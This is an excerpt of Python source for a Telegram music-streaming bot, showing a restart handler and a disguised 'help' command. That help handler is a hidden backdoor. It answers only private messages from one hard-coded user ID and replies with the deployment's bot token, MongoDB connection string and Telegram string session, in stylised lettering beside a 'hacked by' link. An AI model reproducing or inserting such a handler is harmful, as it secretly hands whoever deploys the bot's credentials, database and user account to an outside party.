...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await SHRUSHTHI.stop_stream_force(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await SHRUSHTHI.stop_stream_force(chat_id)
        except:
            pass
...
@app.on_message(
    ...
    & filters.private
    & filters.user(7908848946)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://envs.sh/tLx.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Shrushthi_25)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Shrushthi_25")
                 ]
            ]
         ),
     )
